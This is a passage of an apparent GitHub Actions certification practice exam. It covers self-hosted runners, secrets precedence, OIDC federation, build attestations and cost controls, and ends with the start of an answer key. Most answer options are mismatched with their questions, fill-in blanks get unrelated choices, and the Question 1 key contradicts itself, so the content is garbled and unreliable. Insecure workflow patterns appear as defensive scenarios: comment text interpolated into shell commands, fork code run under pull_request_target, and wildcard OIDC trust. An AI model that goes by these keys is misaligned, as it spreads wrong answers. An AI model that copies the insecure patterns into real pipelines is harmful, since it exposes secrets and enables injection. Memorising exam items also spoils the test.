### 69. AegisRail Logistics enables `Require actions to be pinned to a full-length commit SHA` at the Organization level. A developer writes `uses: ./.github/actions/local-helper` (`a local path action inside the same repository`) and asks whether local `./` actions fail the SHA-pinning policy. How does GitHub evaluate local `./` actions?

- **A.** Enforce `Allow select actions and reusable workflows` (`GitHub-created`, `Verified creators`, internal `org/*`), **`Require actions to be pinned to a full-length commit SHA`**, and fork PR approvals
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 70. In `Organization -> Settings -> Actions -> General`, AegisRail Logistics reviews `Fork pull request workflows in private repositories`. Even inside a `Private` or `Internal` repository where collaborators fork into private user namespaces, why is `Send secrets and variables to workflows from fork pull requests` disabled by default?

- **A.** Enforce `Allow select actions and reusable workflows` (`GitHub-created`, `Verified creators`, internal `org/*`), **`Require actions to be pinned to a full-length commit SHA`**, and fork PR approvals
- **B.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **C.** No — `on: pull_request_target` runs with base-repo `secrets.*` and write-capable `GITHUB_TOKEN`; checking out and executing untrusted fork PR code leaks secrets immediately
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 71. AegisRail Logistics's governance board standardizes Enterprise Actions policies across 14 organizations. Which three configurations align with GitHub's enterprise security baseline? Select three.

- **A.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Store shared actions/reusable workflows in `Internal`/`Private` repos with `Actions -> General -> Access` enabled for the enterprise and enforce `Allow select actions` + full-SHA pinning
- **E.** Set `Repository Settings -> Actions -> General -> Access` on `Internal`/`Private` action repos to `Accessible from repositories in the enterprise` (`or organization`)
- **F.** Enforce `Allow select actions and reusable workflows` (`GitHub-created`, `Verified creators`, internal `org/*`), **`Require actions to be pinned to a full-length commit SHA`**, and fork PR approvals

### 72. AegisRail Logistics migrates off deprecated community `actions-runner-controller` (`summerwind` webhook/CRD `RunnerDeployment`) to GitHub's officially supported GA Kubernetes autoscaler. Complete the two official OCI Helm chart names hosted under `oci://ghcr.io/actions/actions-runner-controller-charts/`: `gha-runner-scale-set-controller` and `____`.

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Combine standard/`ubuntu-slim` hosted runners, autoscaling **Larger runners** (static IPs, GPU, high RAM), and ephemeral self-hosted runners (`--ephemeral`, `generate-jitconfig`, Kubernetes `ARC` `gha-runner-scale-set`)
- **C.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 73. Why does GA `gha-runner-scale-set` scale from `minRunners: 0` cleanly WITHOUT exposing an inbound webhook ingress URL from `github.com` into AegisRail Logistics's private Kubernetes cluster?

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Combine standard/`ubuntu-slim` hosted runners, autoscaling **Larger runners** (static IPs, GPU, high RAM), and ephemeral self-hosted runners (`--ephemeral`, `generate-jitconfig`, Kubernetes `ARC` `gha-runner-scale-set`)

### 74. AegisRail Logistics deploys GA Kubernetes ARC (`gha-runner-scale-set`) on on-premises OpenShift/Kubernetes clusters to execute customs integration pipelines securely. Place the GitHub App auth, Runner Group scoping, scale-set deployment, and Immutable Actions firewall egress steps in exact order.

- **A.** Deploy deprecated `summerwind` webhook ARC with inbound port 443 open → Skip Runner Group scoping across all org repos → Keep persistent workspaces across unrelated jobs → Disable Kubernetes RBAC
- **B.** Bake `./config.sh` `.runner` files into a VM image cloned across 20 pods → Attach an `arm64` macOS Larger runner to Azure VNet → Store cluster kubeconfigs in plain-text `vars.*` → Ignore queue metrics
- **C.** Create an org GitHub App (`runner` perms) & K8s Secret → Create a Runner Group (`no Public repos`; scoped repos) → Deploy `gha-runner-scale-set` controller + scale set (`min: 0`) → Allow egress to `github.com`, `*.actions...`, and `ghcr.io`
- **D.** Authenticate ARC with a personal developer PAT → Enable `Allow public repositories` on the Runner Group → Mount host `/var/run/docker.sock` across stateful pods → Block `*.actions.githubusercontent.com` and `ghcr.io` on the firewall

### 75. AegisRail Logistics provisions Azure Private Networking in `westeurope` (`subnet /24`) for a Runner Group running `ubuntu-24.04-8core` Larger runners (`concurrency = 100`). Complete the required Azure subnet service delegation `____` and explain why ample free IPv4 addresses are required.

- **A.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **B.** Connect Linux/Windows **Larger runners** to **Azure VNets** (`GitHub.Network/networkSettings` + Network Configurations), configure self-hosted `.env` proxies, and allow `pkg.actions.githubusercontent.com` + `ghcr.io`
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions

### 76. AegisRail Logistics audits firewall and DNS requirements for Azure VNet-integrated Larger runners AND on-prem self-hosted runners. Which two networking rules must hold for every runner job to succeed? Select two.

- **A.** Connect Linux/Windows **Larger runners** to **Azure VNets** (`GitHub.Network/networkSettings` + Network Configurations), configure self-hosted `.env` proxies, and allow `pkg.actions.githubusercontent.com` + `ghcr.io`
- **B.** Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions
- **C.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **D.** Attach **Azure Private Networking** (`GitHub.Network/networkSettings`) to Linux/Windows Larger runners and allow `*.actions.githubusercontent.com` (`pkg.actions...`) + `ghcr.io` on firewalls
- **E.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **F.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners

### 77. An AegisRail network engineer asks whether calling `GET https://api.github.com/meta` (`the .actions CIDR array`) and putting those CIDRs into a corporate database firewall is recommended to allow standard `ubuntu-latest` hosted runners inbound to private DBs. Why does GitHub warn AGAINST allowlisting `/meta` `.actions` CIDRs on sensitive firewalls?

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Connect Linux/Windows **Larger runners** to **Azure VNets** (`GitHub.Network/networkSettings` + Network Configurations), configure self-hosted `.env` proxies, and allow `pkg.actions.githubusercontent.com` + `ghcr.io`
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions

### 78. In `aegisrail/customs-gw`, a workflow sets `runs-on: { group: rail-eu-runners, labels: [linux, x64] }`. What advantage does the mapping syntax `runs-on: { group: <name>, labels: [...] }` provide over flat array `runs-on: [self-hosted, linux, x64]` when multiple Runner Groups advertise `[self-hosted, linux, x64]`?

- **A.** Isolate compute in Enterprise/Org **Runner Groups** (`Selected orgs` -> `Selected repos` -> `Selected workflows`, blocking `Public` repos) and inspect `_diag/Runner_*.log` vs `Worker_*.log`
- **B.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 79. AegisRail Logistics's SRE team builds real-time Grafana panels for runner queue wait times (`queued` -> `in_progress` -> `completed`) across 8 Runner Groups. Which two native GitHub telemetry streams deliver real-time runner job lifecycle events? Select two.

- **A.** Isolate compute in Enterprise/Org **Runner Groups** (`Selected orgs` -> `Selected repos` -> `Selected workflows`, blocking `Public` repos) and inspect `_diag/Runner_*.log` vs `Worker_*.log`
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **E.** Deploy ephemeral `ARC` (`gha-runner-scale-set`) or Larger runners inside **Runner Groups** restricted to selected orgs, selected repos, and trusted workflow paths (`never Public repos`)
- **F.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 80. A decommissioning script removes an offline VM from AWS EC2 without running `./config.sh remove` inside the guest first, leaving a stale `Offline` runner entry inside Organization Runner Group `rail-eu-runners`. Complete the REST API call `____ /orgs/aegisrail/actions/runners/{runner_id}` that cleans up the stale registration immediately.

- **A.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **B.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **C.** Isolate compute in Enterprise/Org **Runner Groups** (`Selected orgs` -> `Selected repos` -> `Selected workflows`, blocking `Public` repos) and inspect `_diag/Runner_*.log` vs `Worker_*.log`
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 81. AegisRail Logistics builds golden Windows Server 2025 self-hosted runner AMIs using Packer so `.NET 8/9`, `Java 21`, `Maven`, and `Docker` match GitHub's hosted image paths. Complete the official open-source GitHub repository `actions/____` that publishes the exact Packer templates and preinstalled software manifests.

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **C.** Check `actions/runner-images` release notes & `$RUNNER_TOOL_CACHE` (`setup-node`/`setup-python`/`setup-java` resolve cached binaries first or download + cache) vs custom golden images / `container:` jobs
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 82. On self-hosted Linux runners with custom container hooks (`ACTIONS_RUNNER_CONTAINER_HOOKS=/opt/runner/k8s/index.js`), how does GitHub's `runner-container-hooks` architecture isolate `container:` and `services:` steps inside Kubernetes ARC without Docker-in-Docker (`dind`)?

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Check `actions/runner-images` release notes & `$RUNNER_TOOL_CACHE` (`setup-node`/`setup-python`/`setup-java` resolve cached binaries first or download + cache) vs custom golden images / `container:` jobs
- **C.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **D.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners

### 83. AegisRail Logistics defines Organization secret `ARTIFACTORY_TOKEN` (`Selected repositories: customs-gw`), AND `customs-gw` also defines Repository secret `ARTIFACTORY_TOKEN` (`an old expired key!`). Jobs in `customs-gw` fail `401 Unauthorized` even after rotating the Organization secret! Why?

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **C.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **D.** Scope encrypted `secrets.*` (`<=48 KB`, write-only) and plain-text `vars.*` across `Organization`, `Repository`, and `Environment` (`precedence: Environment > Repository > Organization`)

### 84. An architect at AegisRail Logistics checks whether GitHub Enterprise Cloud provides an "Enterprise-level Actions Secrets" UI above Organizations (`vs Organization/Repository/Environment secrets`) and how multi-org secrets are managed. Which two statements are accurate? Select two.

- **A.** Scope sensitive credentials via `Environment > Repository > Organization` `secrets.*` (`encrypted via LibSodium on REST API`) and store plain-text parameters in `vars.*`
- **B.** Scope encrypted `secrets.*` (`<=48 KB`, write-only) and plain-text `vars.*` across `Organization`, `Repository`, and `Environment` (`precedence: Environment > Repository > Organization`)
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **E.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **F.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback

### 85. AegisRail Logistics's central security broker syncs rotated HSM tokens into Organization Actions secrets across 6 GHEC organizations via the GitHub REST API (`scoped strictly to Selected repositories`). Order the App token, `/public-key` fetch, LibSodium sealed-box encryption, and `PUT` request steps.

- **A.** Commit the encrypted blob into `.github/workflows/rotate.yml` → Encrypt with a local AES passphrase unknown to GitHub → Issue `admin:enterprise` classic PATs everywhere → Reboot self-hosted runners to load secrets
- **B.** Name the secret `GITHUB_API_KEY` (`reserved GITHUB_ prefix`) → Upload a `96 KB` secret (`exceeding the 48 KB cap`) → Send unauthenticated curl calls → Expect Org secrets to override `production` Environment secrets
- **C.** POST the plaintext secret to `/orgs/{org}/actions/variables` → Base64-encode without LibSodium encryption → Set `visibility: "all"` exposing secrets to `Public` repos → Read plaintext back via `GET /orgs/{org}/actions/secrets/{name}`
- **D.** Mint an App token (`organization_actions_secrets: write`) → GET `/orgs/{org}/actions/secrets/public-key` (`key_id`, `key`) → Encrypt value client-side via LibSodium `crypto_box_seal` → PUT `/orgs/{org}/actions/secrets/{name}` (`selected` repos)

### 86. When updating an Environment secret (`e.g., DB_PASS` inside `production` Environment of repository ID `441092`) via the GitHub REST API, complete the public-key lookup endpoint path before calling `PUT`: `GET /repositories/441092/environments/production/secrets/____` (`or /repos/{owner}/{repo}/environments/{environment_name}/secrets/public-key`).

- **A.** Manage secrets & variables programmatically via REST API (`encrypting secrets client-side with LibSodium crypto_box_seal against .../public-key`) or `gh secret set` / `gh variable set`
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **D.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step

---

## Domain 5 — Secure and optimize automation (10–15% official weight · 14 questions)

### 87. In `aegisrail/customs-gw`, Deployment Environment `eu-border-prod` configures `Wait timer: 15` minutes AND `Required reviewers: @aegisrail/cab-leads`. When a deployment run reaches `eu-border-prod`, how do the `Wait timer` and `Required reviewers` interact before the job starts?

- **A.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Gate deployments with **Environments** (`Required reviewers`, `Prevent self-review`, `Wait timer`, `Selected branches/tags`, **Custom deployment protection rules**) and vet Marketplace actions (`Verified creator`, source & SHA audit)
- **D.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name

### 88. A developer in `aegisrail/fleet-core` proposes adding `uses: random-fork/slack-notify@main` because it has 40 stars on GitHub. Beyond rejecting `@main`, which three security criteria should AegisRail Logistics's action vetting rubric check before allowlisting any third-party action?

- **A.** Gate deployments with **Environments** (`Required reviewers`, `Prevent self-review`, `Wait timer`, `Selected branches/tags`, **Custom deployment protection rules**) and vet Marketplace actions (`Verified creator`, source & SHA audit)
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release

### 89. In `aegisrail/customs-gw`, an issueops slash-command workflow runs `run: ./scripts/dispatch.sh "${{ github.event.comment.body }}"`. Proposed solution: Keep `${{ github.event.comment.body }}` directly inside the `run:` command line wrapped in double quotes. Does this meet the goal?

- **A.** Append `KEY=VALUE` to `$GITHUB_ENV`, paths to `$GITHUB_PATH`, outputs to `$GITHUB_OUTPUT`, and emit `::notice::` / `::error::` / `::add-mask::` commands
- **B.** No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first
- **C.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **D.** Prevent **script injection** by never interpolating untrusted `${{ github.event.* }}` (`PR title/body, branch head_ref, issue comment`) directly inside `run:`—bind via `env:` (`PR_TITLE: ${{ ... }}`) and quote `"$PR_TITLE"`

### 90. AegisRail Logistics wants to post a test-coverage PR comment on external fork pull requests in public SDK `aegisrail/edifact-java` safely WITHOUT exposing repository secrets during `mvn test`. Which two-workflow separation pattern (`recommended by GitHub Security Lab`) achieves this safely? Select two.

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** No — `on: pull_request_target` runs with base-repo `secrets.*` and write-capable `GITHUB_TOKEN`; checking out and executing untrusted fork PR code leaks secrets immediately
- **D.** Prevent **script injection** by never interpolating untrusted `${{ github.event.* }}` (`PR title/body, branch head_ref, issue comment`) directly inside `run:`—bind via `env:` (`PR_TITLE: ${{ ... }}`) and quote `"$PR_TITLE"`
- **E.** Pass untrusted `github.event.*` text (`PR titles, branch names, comments`) through intermediate `env:` variables (`never raw ${{ ... }} inside run:`) and never checkout untrusted forks in `pull_request_target`
- **F.** No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first

### 91. In `aegisrail/tariff-engine`, a workflow publishes a Maven package to GitHub Packages (`https://maven.pkg.github.com/aegisrail/tariff-engine`) using `GITHUB_TOKEN` without creating releases or pushing Git commits. Complete the minimal job-level `permissions:` block: `{ contents: read, ____: write }`.

- **A.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **B.** Enforce org-default `Read-only` `GITHUB_TOKEN`, grant minimal job-level `permissions:` (`e.g., contents: read, pull-requests: write`), and use short-lived **GitHub App installation tokens** (`not PATs`) for cross-repo calls
- **C.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 92. In public repository `aegisrail/edifact-java`, an engineer wants external fork PRs to run `mvn verify` with access to `secrets.SONAR_TOKEN`. Proposed solution: Change the workflow trigger from `on: pull_request` to `on: pull_request_target` and add `uses: actions/checkout@v4` (`with: ref: ${{ github.event.pull_request.head.sha }}`) before `mvn verify`. Does this meet the goal?

- **A.** No — `on: pull_request_target` runs with base-repo `secrets.*` and write-capable `GITHUB_TOKEN`; checking out and executing untrusted fork PR code leaks secrets immediately
- **B.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **C.** Distinguish `pull_request` (`GITHUB_SHA` = ephemeral test merge commit `refs/pull/:n/merge`) from `push` (`GITHUB_SHA` = branch head commit `refs/heads/<branch>`)
- **D.** Enforce org-default `Read-only` `GITHUB_TOKEN`, grant minimal job-level `permissions:` (`e.g., contents: read, pull-requests: write`), and use short-lived **GitHub App installation tokens** (`not PATs`) for cross-repo calls

### 93. AegisRail Logistics configures Azure Entra ID Workload Identity Federation (`azure/login@v2`) for `aegisrail/customs-gw` deployments triggered ONLY from branch `main` (`with NO Deployment Environment configured on that staging job`). What exact `subject` (`sub`) string must the Entra ID federated credential match?

- **A.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **B.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **C.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **D.** Eliminate static cloud keys with **OIDC** (`permissions: id-token: write`), validating `iss` (`https://token.actions.githubusercontent.com`), `aud`, and strict `sub` / `job_workflow_ref` claims in AWS/Azure/GCP/Vault

### 94. AegisRail Logistics migrates `aegisrail/customs-gw` Azure AKS production deployments to passwordless Entra ID OIDC Workload Identity Federation gated by `production` Environment reviewers. Order the Environment setup, federated credential subject binding, job permissions, and runtime login steps.

- **A.** Gate `production` Environment (`reviewers`, `main`) → Pin cloud OIDC `aud` & `sub: repo:<o>/<r>:environment:production` → Set `environment: production` & `id-token: write` → Exchange OIDC JWT at runtime & purge static keys
- **B.** Save a static OIDC JWT inside `secrets.OIDC_JWT` once a month → Disable TLS verification on cloud login steps → Skip `aud` validation in Vault → Allow developers to self-approve their own `production` runs
- **C.** Run deploy on `pull_request_target` checking out untrusted fork PR code → Set `permissions: write-all` globally → Request OIDC tokens before Environment reviewers approve → Print cloud tokens to `$GITHUB_STEP_SUMMARY`
- **D.** Set cloud OIDC trust `sub` to wildcard `repo:*:*` → Omit `permissions: id-token: write` on the job → Leave `environment:` unset while expecting reviewer gates to pause → Store static cloud root keys in `vars.*`

### 95. AegisRail Logistics signs SLSA build provenance attestations (`actions/attest-build-provenance`) for `customs-gw` OCI images and enforces `gh attestation verify` inside its AKS deployment pipeline. Order the permissions, immutable digest build, provenance signing, and CLI verification steps.

- **A.** Compute an unsigned `md5sum` in bash → Commit private PGP signing keys into Git → Run `gh attestation verify` without `-R` / `--owner` → Disable Immutable Releases on prod artifacts
- **B.** Run `attest-build-provenance` with `permissions: read-all` only → Attest a mutable `:latest` image tag with no `sha256:` digest → Skip verification at deploy time → Edit build steps locally in caller repos
- **C.** Grant `id-token: write` & `attestations: write` in reusable CI → Build artifact / immutable `sha256:` image digest → Sign SLSA provenance via `actions/attest-build-provenance` → Verify via `gh attestation verify -R <o>/<r> --signer-workflow`
- **D.** Compile binaries on an unmonitored developer laptop outside Actions → Upload unsigned binaries to a public bucket → Pin third-party actions to floating `@main` → Delete attestation bundles prior to admission checks

### 96. AegisRail Logistics deploys signed binaries into an air-gapped rail signaling enclave that has ZERO outbound internet access at deploy time (`so gh attestation verify cannot query github.com online`). How does `gh attestation verify` verify provenance inside an air-gapped environment?

- **A.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **B.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Pin actions to **40-char commit SHAs** (`aligned with Immutable Actions`) and generate/verify **SLSA Artifact Attestations** (`actions/attest-build-provenance` / `actions/attest@v4` + `gh attestation verify`)

### 97. In `aegisrail/fleet-core`, Gradle wrapper setup + dependency downloads repeat across 8 jobs in `ci.yml`. Instead of hand-writing `actions/cache@v4` path globs for `~/.gradle/caches` and `~/.gradle/wrapper` (`which risks lock-file corruption if active daemons write during save`), which official setup integration optimizes Gradle caching safely?

- **A.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Accelerate builds with `actions/cache@v4` (`hashFiles` keys + `restore-keys` fallback) and lower storage spend via `retention-days` + REST API org/repo artifact & log retention caps
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 98. AegisRail Logistics's FinOps audit shows 4.2 TB of stale intermediate `upload-artifact@v4` tarballs retained for `90 days` across 300 repositories. Which two policy and workflow changes slash metered Actions storage immediately? Select two.

- **A.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Accelerate builds with `actions/cache@v4` (`hashFiles` keys + `restore-keys` fallback) and lower storage spend via `retention-days` + REST API org/repo artifact & log retention caps
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **E.** Enable `concurrency: { cancel-in-progress: true }` on PR branches, cache dependencies with `actions/cache@v4`, lower `retention-days`, and prefer Linux (`1x`) over macOS (`10x`)
- **F.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 99. AegisRail Logistics runs 1,200 daily OpenAPI lint and PR title-check jobs that run a 5-second Node script with zero Docker usage. Complete the cost-optimized single-vCPU hosted Linux runner label `runs-on: ____` designed specifically for lightweight non-container automation.

- **A.** Cut runner spend with `concurrency: { cancel-in-progress: true }`, path filters, Linux (`1x`) / `ubuntu-slim` over Windows (`2x`) / macOS (`10x`), lean matrices (`exclude`), and `timeout-minutes` caps
- **B.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 100. In `aegisrail/customs-gw`, an engineer removes `timeout-minutes` from a self-hosted integration job, and a hung network socket leaves 12 self-hosted runners blocked for `6 hours` each (`360 minutes`, GitHub's default job timeout!). What best practice prevents hung jobs from starving runner fleets and inflating hosted bills?

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **C.** Cut runner spend with `concurrency: { cancel-in-progress: true }`, path filters, Linux (`1x`) / `ubuntu-slim` over Windows (`2x`) / macOS (`10x`), lean matrices (`exclude`), and `timeout-minutes` caps
- **D.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name

---

## Answer Key and Explanations

### Question 1 — `C` (Author and manage workflows)

Correct answer: C (is correct). Because `pull_request: types: [closed]` fires for BOTH merged and abandoned PRs, guarding the job with `if: github.event.pull_request.merged == true` runs post-merge logic strictly on merged PRs (`note: use pull_request_target or push on main if base secrets are required`). [Skill 1.1: Configure workflows for scheduled, manual, and webhook events | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. GitHub Actions triggers span UTC `cron` schedules on the default branch, manual `workflow_dispatch`, Git/GitHub webhooks, and external REST `repository_dispatch` events.
- **D:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).

### Question 2 — `E, F` (Author and manage workflows)

Correct answers: E and F (are correct). `on: workflow_dispatch` supports `type: choice` (`options: [north, south, alpine]`) and `type: boolean` (`default: true`) across branches containing the workflow file, while `on: schedule: [{ cron: '30 1 * * *' }]` fires strictly in UTC from the default branch (`and may experience brief queue delays at :00/:30 peak load`). [Skill 1.1: Configure workflows for scheduled, manual, and webhook events | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows)]

